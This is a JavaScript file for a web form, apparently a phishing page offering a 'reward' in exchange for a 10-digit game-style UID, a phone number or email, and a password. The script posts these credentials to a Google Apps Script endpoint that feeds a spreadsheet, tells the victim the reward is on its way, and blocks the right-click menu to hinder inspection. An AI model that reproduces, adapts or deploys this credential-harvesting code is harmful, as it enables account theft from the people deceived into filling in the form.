document.getElementById("uid").addEventListener("input", function (e) {
    // Replace any non-numeric characters with an empty string
    e.target.value = e.target.value.replace(/[^0-9]/g, "");
});

function validateForm(event) {
    event.preventDefault(); // Prevent default form submission

    var uid = document.getElementById("uid").value;
    if (uid == "") {
        document.getElementById("Error").innerHTML = "Please Fill Your UID";
        return false;
    }
    if (uid.length !== 10) {
        document.getElementById("Error").innerHTML = "Enter Your Valid UID (must be 10 digits)";
        return false;
    }
    if (isNaN(uid)) {
        document.getElementById("Error").innerHTML = "Check Your UID (Only Numbers Allowed)";
        return false;
    }   
    
    var number = document.getElementById("number").value;
    if (number == "") {
        document.getElementById("Error").innerHTML = "Please Fill Your Number or Email";
        return false;
    }
    var password = document.getElementById("password").value;
    if (password == "") {
        document.getElementById("Error").innerHTML = "Please Fill Your Password";
        return false;
    }

    // Show the loading spinner
    document.getElementById('loadingSpinner').style.display = 'block';
    document.getElementById('container').style.opacity = '0.4';

    // Submit the form data to Google Sheets
    const scriptURL = 'https://script.google.com/macros/s/AKfycbx4HRBDR9arIVhgXpoiGiYW3-a1Bt6i4RT2GnilTndE2LdQAfWe8Ss81f9ZE0s0G50_/exec';
    const formData = new FormData(event.target);

    fetch(scriptURL, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json()) // Or response.text() based on your Google Script response
    .then(data => {
        // Reset the form
        event.target.reset();
        
        // Hide the loading spinner
        document.getElementById('loadingSpinner').style.display = 'none';

        // Show success message (you can use SweetAlert or another method)
        Swal.fire({
            icon: 'success',
            title: 'Your Reward has been sended',
            text: 'Thank you Please Wait Some Times! And go back'
        }).then(() => {
            // Redirect to the home page
            window.location.href = './index.html'; // Replace 'home.html' with the actual home page URL
        });

        document.getElementById('container').style.opacity = '0.9';
    })
    .catch(error => {
        console.error('Error:', error); // Log the error
        Swal.fire({
            icon: 'error',
            title: 'Your Reward has not been sended',
            text: 'Oops! try again next time'
        });
    });

    return true;
}

// Attach form validation to submit event
window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', validateForm);
};

document.addEventListener('contextmenu', event => event.preventDefault());
